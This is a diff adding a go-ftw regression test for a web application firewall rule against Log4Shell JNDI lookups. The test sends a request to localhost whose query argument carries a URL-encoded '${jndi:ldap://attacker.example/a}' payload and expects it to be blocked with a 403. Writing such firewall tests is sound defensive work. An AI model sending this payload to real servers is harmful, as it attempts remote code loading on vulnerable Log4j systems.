@@ -1,0 +1,20 @@
+---
+meta:
+  author: "schild-testlab"
+  description: "Log4Shell JNDI lookup (REQUEST-944). Schild test-lab regression subset in go-ftw format (written for this lab, not copied from CRS)."
+rule_id: 944150
+tests:
+  - test_id: 1
+    desc: "jndi lookup in a query argument"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          port: 80
+          method: "GET"
+          uri: '/api/items?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D'
+          headers:
+            Host: 'shop.example'
+            User-Agent: 'OWASP CRS test agent'
+            Accept: '*/*'
+        output:
+          status: 403
